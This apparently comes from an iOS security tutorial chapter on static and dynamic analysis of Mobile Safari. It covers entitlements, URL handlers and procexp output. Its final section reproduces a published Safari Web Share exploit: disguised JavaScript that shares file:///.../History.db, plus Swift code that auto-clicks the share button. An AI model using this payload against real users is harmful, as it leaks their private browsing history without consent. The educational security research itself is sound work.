
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="canonical" href="https://faisalmemon.github.io/the-road-to-zero/InspectingMobileSafari/">
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-7.3.6">
    
    
      
        <title>Inspecting Mobile Safari - The Road to Zero</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.a57b2b03.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.3f5d1f46.min.css">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
      
    
    
    
    
      


    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
  
    
    <script>function __prefix(e){return new URL("..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#inspecting-mobile-safari" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="The Road to Zero" class="md-header__button md-logo" aria-label="The Road to Zero" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            The Road to Zero
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Inspecting Mobile Safari
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        
<a href="https://github.com/faisalmemon/the-road-to-zero/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="The Road to Zero" class="md-nav__button md-logo" aria-label="The Road to Zero" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    The Road to Zero
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/faisalmemon/the-road-to-zero/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../Author/" class="md-nav__link">
        About
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../Introduction/" class="md-nav__link">
        Introduction
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../ZeroDay/" class="md-nav__link">
        Zero Day
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../Hammer/" class="md-nav__link">
        The Hammer
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../Mach/" class="md-nav__link">
        Mach Programming
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../KernelDebugging/" class="md-nav__link">
        Kernel Debugging
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../JailbreakSetup/" class="md-nav__link">
        Jailbreak Setup
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Inspecting Mobile Safari
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Inspecting Mobile Safari
      </a>
      
        


<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#why-is-mobile-safari-interesting" class="md-nav__link">
    Why is Mobile Safari interesting?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab-setup" class="md-nav__link">
    Lab Setup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#static-analysis" class="md-nav__link">
    Static Analysis
  </a>
  
    <nav class="md-nav" aria-label="Static Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#entitlements" class="md-nav__link">
    Entitlements
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hidden-functionality" class="md-nav__link">
    Hidden functionality
  </a>
  
    <nav class="md-nav" aria-label="Hidden functionality">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mobilesafari-url-handlers" class="md-nav__link">
    MobileSafari URL Handlers
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#handling-x-web-search" class="md-nav__link">
    Handling x-web-search
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    Dynamic Analysis
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#process-explorer" class="md-nav__link">
    Process Explorer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mobilesafari-history-exploit" class="md-nav__link">
    MobileSafari History Exploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#documenting-the-journey" class="md-nav__link">
    Documenting the Journey
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../Leveraging/" class="md-nav__link">
        Leveraging Research
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../Defense/" class="md-nav__link">
        iOS Defense Mechanisms
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../Bibliography/" class="md-nav__link">
        Bibliography
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#why-is-mobile-safari-interesting" class="md-nav__link">
    Why is Mobile Safari interesting?
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab-setup" class="md-nav__link">
    Lab Setup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#static-analysis" class="md-nav__link">
    Static Analysis
  </a>
  
    <nav class="md-nav" aria-label="Static Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#entitlements" class="md-nav__link">
    Entitlements
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hidden-functionality" class="md-nav__link">
    Hidden functionality
  </a>
  
    <nav class="md-nav" aria-label="Hidden functionality">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mobilesafari-url-handlers" class="md-nav__link">
    MobileSafari URL Handlers
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#handling-x-web-search" class="md-nav__link">
    Handling x-web-search
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    Dynamic Analysis
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#process-explorer" class="md-nav__link">
    Process Explorer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mobilesafari-history-exploit" class="md-nav__link">
    MobileSafari History Exploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#documenting-the-journey" class="md-nav__link">
    Documenting the Journey
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/faisalmemon/the-road-to-zero/edit/master/docs/InspectingMobileSafari.md" title="Edit this page" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <h1 id="inspecting-mobile-safari">Inspecting Mobile Safari</h1>
<h2 id="why-is-mobile-safari-interesting">Why is Mobile Safari interesting?</h2>
<p>The iPhone web browser is Safari, or rather "Mobile Safari" because of functionality differences from the desktop "Safari".  Web browsers are better thought of as Operating Systems rather than Applications.  They have powerful access into the system, and can dynamically create and run JavaScript code.  Therefore they have their own Sandbox execution environment.  They also present hardware functionality to Web Apps, such as the Microphone and Speaker.  Since users expect a great high-performance experience from the Web, the Web Browser is given the privilege to run dynamically generated code from websites.  If it did not have this privilege, websites would run significantly slower than competitor devices.  This commercial reason is why we have a foothold into the system.  If the Mobile Safari sandbox can be circumvented, an execution chain can be started.</p>
<h2 id="lab-setup">Lab Setup</h2>
<p>We assume our host machine is an Apple Silicon based Mac.  It does not have to be this type of Mac or even a system running macOS; it could be a GNU/Linux system.  But for the sake of simplicity we make this assumption.</p>
<p>We assume our Mac has the <a href="https://brew.sh">Brew</a> package manager installed.</p>
<p>We assume we have an iPod Touch running iOS 13.5 jailbroken, and setup with ssh trust and also an alias for convenience.</p>
<div class="highlight"><pre><span></span><code>cat ~/.ssh/config
</code></pre></div>
<p>on our setup shows
<div class="highlight"><pre><span></span><code>Host ipodtouch13_5
        User root
        HostName 192.168.1.85
</code></pre></div></p>
<p>Then we can copy over the <code>MobileSafari</code> app with
<div class="highlight"><pre><span></span><code>scp -pr ipodtouch13_5:/Applications/MobileSafari.app /tmp
</code></pre></div></p>
<p>In order to understand the privileges of this important app, we need to use the <code>ldid</code> tool.  We can get the tool via</p>
<div class="highlight"><pre><span></span><code>arch -x86_64 brew install ldid
</code></pre></div>
<p>The command prefix <code>arch -x86_64</code> ensures the command works from an Apple Silicon Mac.</p>
<h2 id="static-analysis">Static Analysis</h2>
<p>Let us first start by doing a static analysis of <code>MobileSafari</code>.  That is, analysing it without running it.</p>
<h3 id="entitlements">Entitlements</h3>
<p>It is worthwhile spending some time looking carefully at the entitlements of MobileSafari.  Every entitlement is a privilege, and therefore an opportunity to gain privilege if a vulnerability is found.</p>
<div class="highlight"><pre><span></span><code>cd /tmp/MobileSafari.app
ldid -e MobileSafari
</code></pre></div>
<p>This will produce a lot of output!  One interesting thing to explore is anything Sandbox related.  We can tune our command with a regular expression match as follows:</p>
<div class="highlight"><pre><span></span><code>ldid -e MobileSafari | grep -i -B 17 sandbox
</code></pre></div>
<p>which yields
<div class="highlight"><pre><span></span><code>    &lt;key&gt;com.apple.security.exception.mach-lookup.global-name&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;com.apple.DocumentManagerCore.Downloads&lt;/string&gt;
        &lt;string&gt;com.apple.proactive.PersonalizationPortrait.NamedEntity.readOnly&lt;/string&gt;
        &lt;string&gt;com.apple.coreservices.lsbestappsuggestionmanager.xpc&lt;/string&gt;
        &lt;string&gt;com.apple.suggestd.urls&lt;/string&gt;
        &lt;string&gt;com.apple.LORemoteUIPinService&lt;/string&gt;
        &lt;string&gt;com.apple.remotemanagementd.management-state&lt;/string&gt;
        &lt;string&gt;com.apple.SafariBookmarksSyncAgent&lt;/string&gt;
        &lt;string&gt;com.apple.Safari.SafeBrowsing.Service&lt;/string&gt;
        &lt;string&gt;com.apple.SafariCloudHistoryPushAgent&lt;/string&gt;
        &lt;string&gt;com.apple.mobile.keybagd.xpc&lt;/string&gt;
        &lt;string&gt;com.apple.parsecd&lt;/string&gt;
        &lt;string&gt;com.apple.parsec-fbf&lt;/string&gt;
        &lt;string&gt;com.apple.coreduetd.knowledge&lt;/string&gt;
        &lt;string&gt;com.apple.internal.safaricyclerd&lt;/string&gt;
        &lt;string&gt;com.apple.watchlistd.xpc&lt;/string&gt;
        &lt;string&gt;com.apple.Safari.SandboxBroker&lt;/string&gt;
</code></pre></div></p>
<p>The same information can be obtained from the <a href="../Bibliography/#ED">Entitlements Cross-Reference</a> website.  It has a searchable index of entitlements for many versions of iOS and macOS.</p>
<p>So we now are able to start building a mental model of what Mobile Safari it, and what its attack surface is.  We see the processes, threads, memory, and Mach ports that are used.  We also see all the files that have been opened by <code>MobileSafari</code>.</p>
<h3 id="hidden-functionality">Hidden functionality</h3>
<p>The most fruitful way to look at a piece of technology is from the angle of triggering lesser-used functionality, or undocumented functionality.  In practice a software project will grow over time, and new engineers are added to the project and often the original engineers move to other projects or roles.  This means some of the earlier functionality can be less well understood.  Particularly in the beginning of a project, a lot of functionality is offered, but only a subset of functionality becomes popular.  So less used features are often left in the product and later changes to the product can expose bugs, faults and exploitable conditions via the older less used functionality of the software.  The reason why older functionality is not pruned out is because sometimes it is not clear who is still relying on the older functionality.  So it is "safer" just to keep it in.  But this attitude allows us opportunities to find bugs and potential exploits.</p>
<h4 id="mobilesafari-url-handlers"><code>MobileSafari</code> URL Handlers</h4>
<p>We can explore the URL handler features of MobileSafari by looking at its <code>Info.plist</code> file.</p>
<div class="highlight"><pre><span></span><code>plutil -p /tmp/MobileSafari.app/Info.plist
</code></pre></div>
<p>Amongst the output we see:
<div class="highlight"><pre><span></span><code>&quot;CFBundleURLTypes&quot; =&gt; [
    0 =&gt; {
      &quot;CFBundleURLIsPrivate&quot; =&gt; 1
      &quot;CFBundleURLName&quot; =&gt; &quot;Web App URL&quot;
      &quot;CFBundleURLSchemes&quot; =&gt; [
        0 =&gt; &quot;webclip&quot;
      ]
    }
    1 =&gt; {
      &quot;CFBundleURLName&quot; =&gt; &quot;Web site URL&quot;
      &quot;CFBundleURLSchemes&quot; =&gt; [
        0 =&gt; &quot;http&quot;
        1 =&gt; &quot;https&quot;
      ]
    }
    2 =&gt; {
      &quot;CFBundleURLName&quot; =&gt; &quot;FTP URL&quot;
      &quot;CFBundleURLSchemes&quot; =&gt; [
        0 =&gt; &quot;ftp&quot;
      ]
    }
    3 =&gt; {
      &quot;CFBundleURLName&quot; =&gt; &quot;Web Search URL&quot;
      &quot;CFBundleURLSchemes&quot; =&gt; [
        0 =&gt; &quot;x-web-search&quot;
      ]
    }
    4 =&gt; {
      &quot;CFBundleURLIsPrivate&quot; =&gt; 1
      &quot;CFBundleURLName&quot; =&gt; &quot;MobileSafari Tab URL&quot;
      &quot;CFBundleURLSchemes&quot; =&gt; [
        0 =&gt; &quot;com-apple-mobilesafari-tab&quot;
      ]
    }
  ]
</code></pre></div></p>
<h4 id="handling-x-web-search">Handling <code>x-web-search</code></h4>
<p>We saw earlier that <code>MobileSafari</code> has a URL handler <code>x-web-search</code></p>
<p>From some research on Google and <a href="https://stackoverflow.com/a/50044505">Stack Overflow</a> we can come up with some code to trigger such functionality.</p>
<p>It turns out that the best technology stack to do experimentation and exploit development is to use Objective-C because this gives us the fewest number of abstraction layers between our code and the system.  Objective-C is also more amenable to hacking because it is less type-safe than Swift.  We can craft malicious message calls and call private APIs easily.</p>
<p>In our case, we just make a standard API call as follows:
<div class="highlight"><pre><span></span><code>- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@&quot;x-web-search://?toast&quot;]
                                       options:@{}  completionHandler:^(BOOL success) {
        NSLog(@&quot;status %ld&quot;, (long)success);
    }];
}
</code></pre></div></p>
<p>This indeed will launch the browser and perform a search for "toast" using the default search engine.</p>
<h2 id="dynamic-analysis">Dynamic Analysis</h2>
<p>We now switch to doing a dynamic analysis of <code>MobileSafari</code>.</p>
<h3 id="process-explorer">Process Explorer</h3>
<p>There is a useful tool which allows us to explore a given process on the iDevice and this exposes a lot of low level detail.  It is called <code>procexp</code> by Jonathan Levin.</p>
<p>We install the tool by installing it onto our Mac:
<div class="highlight"><pre><span></span><code>arch -x86_64 brew install procexp
</code></pre></div></p>
<p>and then we transfer it onto our iDevice:
<div class="highlight"><pre><span></span><code>scp /usr/local/bin/procexp ipodtouch13_5:/tmp
</code></pre></div></p>
<p>We then manually launch Safari on the iDevice.  Once it has launched we can send commands to the device and locally store the results on our Mac.</p>
<div class="highlight"><pre><span></span><code>ssh ipodtouch13_5 ps -ef | grep MobileSafari
  501 99988     1   0  4:06PM ??         0:03.45 /Applications/MobileSafari.appMobileSafari
</code></pre></div>
<p>Note that the <code>| grep MobileSafari</code> portion runs on our Mac, and the <code>ps -ef</code> portion runs on the iDevice.</p>
<p>Now from the output of <code>ps</code> we know that the second number is the process identifier (PID).  We can run procexp against this:</p>
<div class="highlight"><pre><span></span><code>ssh ipodtouch13_5 /tmp/procexp 99988 all &gt; mobile_safari.procexp.txt
</code></pre></div>
<p>The full output file, <a href="../mobile_safari.procexp.txt">mobile_safari.procexp.txt</a>, is kept on our Mac.</p>
<p>The output file is quite large, so we'll show a truncated excerpt below:</p>
<div class="highlight"><pre><span></span><code>-----------------
Process: 99988  Name: MobileSafari      Parent:     1   Status: runnable
Container: /private/var/mobile/Containers/Data/Application/FDFCAC6B-8E4F-4381-B354-C0DEAB28D32B
Flags:   64-bit,called exec,session leader,App

Extmods: Task shows no signs of external modification or tampering
Code signing: valid,get-task-allow,installer,require enforcement,require library validation

UID:      501   RUID:   501     SVUID:   501
GID:      501   RGID:   501     SVGID:   501

Virtual size:           4312M (4522409984)      Resident size:          31M (33226752)
Time:     00.08   =    00.08 (User)    +    00.00 (System)
Syscalls:       38961   Mach Traps:   34832
Disk I/O:      55852K Read            25532K Written
No Network I/O detected for this process

#Threads:   6     Workqueues:3 threads (3 running, 0 blocked) State: 0
Thread Info:

(0)                    0x75d0c88f 0000000100180000-0000000100380000 [   2M]r-x/r-x COW /Applications/MobileSafari.app/MobileSafari
(0)                    0x75d0c88f 0000000100380000-0000000100394000 [  80K]r--/rw- PRV /Applications/MobileSafari.app/MobileSafari
.
.
Shared PMAP            0x00000000 0000000270000000-0000000280000000 [ 256M]r--/r-- NUL

Process Hierarchy:
 99988 MobileSafari  has no children

46 File descriptors: MobileSafari     99988 FD  0r  /dev/null @0x0
MobileSafari     99988 FD  1u  /dev/null @0x0
MobileSafari     99988 FD  2u  /dev/null @0x317
MobileSafari     99988 FD  3u  /private/var/mobile/Library/Safari/Bookmarks.db @0x0
.
.
MobileSafari     99988 FD 29u  /private/var/mobile/Library/Safari/History.db @0x0
MobileSafari     99988 FD 30u  /private/var/mobile/Library/Safari/History.db-wal @0x0
MobileSafari     99988 FD 31u  /private/var/mobile/Library/Safari/History.db-shm @0x0
.
.
MobileSafari     99988 FD 45u  /private/var/mobile/Library/Safari/Bookmarks.db @0x0
Jetsam Level: 0
Thread policy version
        PID : 99988 (399071), comm: MobileSafari Flags: PID Suspended, Frozen, DarwinBG, Live Donor, WQ Flags avail
        Size: 18M Max Res: 75M
        IOStats: Disk Reads: 1688 reads (57192448 bytes), 54 writes (26144768 bytes)

                TID: 3721957 State: Waiting  PRI: 4/4 Flags: DarwinBG, Suspended 
                Continuation: 0xfffffff007118af8 (no kernel stack)
                CPU Times: User: 0.612410 secs, System: 0.000000 secs
                Backtrace:
                Frame 0: 0x1b08b3198
                Frame 1: 0x1b08b260c
                Frame 2: 0x1b0a5d468
                Frame 3: 0x1b0a5849c
                Frame 4: 0x1b0a57ce8
                Frame 5: 0x1baba238c
                Frame 6: 0x1b4b86444
                Frame 7: 0x100186770
                Frame 8: 0x1b08df8f0
                Frame 9: 0x0

                IOStats: Disk Reads: 592 reads (19787776 bytes), 2 writes (8192 bytes)
.
.
MobileSafari:99988:0x103        task, kernel 0x79c64c07
MobileSafari:99988:0x203
MobileSafari:99988:0x303        (thread) 0x79d853e7
MobileSafari:99988:0x403
MobileSafari:99988:0x507
MobileSafari:99988:0x603
MobileSafari:99988:0x707        (HSP: Coalition)-&gt;launchd:1:0x1103
MobileSafari:99988:0x803        (clock) 0x72b03a4f
MobileSafari:99988:0x903        (semaphore) 0x7a8ec76f
MobileSafari:99988:0xa03
MobileSafari:99988:0xb03        (voucher) 0x73ec9147
MobileSafari:99988:0xc03
MobileSafari:99988:0xd07        &lt;-notifyd:58084:0xcf0b
MobileSafari:99988:0xe03        &lt;-logd:58032:0x2bb0b
MobileSafari:99988:0xf03        -&gt;logd:58032:0x52713
MobileSafari:99988:0x1003       &lt;-cfprefsd:58085:0x27773
MobileSafari:99988:0x1103       -&gt;logd:58032:0x1b803
.
.
MobileSafari:99988:0x15123      -&gt;ContextService:58199:0x2f13
MobileSafari:99988:0x15217      &quot;com.apple.cloudd&quot;      -&gt;cloudd:58141:0x2603
MobileSafari:99988:0x1530f
</code></pre></div>
<h3 id="mobilesafari-history-exploit"><code>MobileSafari</code> History Exploit</h3>
<p>There is a vulnerability which can be exploited from the output of the process explorer.  We notice that the <code>MobileSafari</code> app uses predictable paths for sensitive resources, such as the browsing history.</p>
<p>From
<div class="highlight"><pre><span></span><code>MobileSafari     99988 FD 29u  /private/var/mobile/Library/Safari/History.db @0x0
</code></pre></div></p>
<p>we see it opens the file (with a predictable path)
<div class="highlight"><pre><span></span><code>/private/var/mobile/Library/Safari/History.db
</code></pre></div></p>
<p>In an exploit documented at <a href="../Bibliography/#MSSV">https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html</a> by Pawel Wylecial, it was demonstrated that when performing a Share the Share URL is not constrained to the web page resources.  Private resources via the <code>file://</code> schema are supported so this means a malicious share URL can leak sensitive information.</p>
<p>The malicious Javascript code is:
<div class="highlight"><pre><span></span><code>&lt;script&gt;
var opts = {
text: &#39;check out this cute kitten! http://somerandomimagewebsite.com/cat.jpg\n
\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&#39;,
url: &#39;file:///private/var/mobile/Library/Safari/History.db&#39;};

function run() {
 navigator.share(opts);
}
&lt;/script&gt;
</code></pre></div></p>
<p>A button action runs this code:
<div class="highlight"><pre><span></span><code>&lt;button id=&quot;share-btn-id&quot; class=&quot;button button1&quot; onclick=&#39;run();&#39;&gt;
Share this photo&lt;/button&gt;
</code></pre></div></p>
<p>The containing app even clicks on this button on behalf of the user so they are only left with picking the share target:
<div class="highlight"><pre><span></span><code>extension ViewController: WKNavigationDelegate {
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        if !autoPressedButton {
            webViewOutlet.evaluateJavaScript(
            &quot;document.getElementById(&#39;share-btn-id&#39;).click()&quot;) { (_, error) in
                if error == nil {
                    self.autoPressedButton = true
                }
            }
        }
    }
}
</code></pre></div></p>
<p>To demonstrate the vulnerability with a free standing app, see <code>examples/history</code> from the <a href="../Bibliography/#TRTZ">The Road to Zero GitHub</a> website.  This app merely loads a malicious web page, which has a link to file:///private/var/mobile/Library/Safari/History.db, and upon loading, will also automatically click the share button, so all the user has to do is to pick the sharing target, such as Messages.</p>
<table>
<thead>
<tr>
<th align="center"><img alt="Mobile Safari Share Vulnerability" src="../mobile-safari-share-vulnerability.jpg" /></th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><strong>Mobile Safari Share Vulnerability</strong></td>
</tr>
</tbody>
</table>
<p>Once shared, the recipient can view the website browsing history of the victim using a simple SQL Lite command having first saved the <code>History.db</code> file locally on a Mac.  We see output similar to the below:</p>
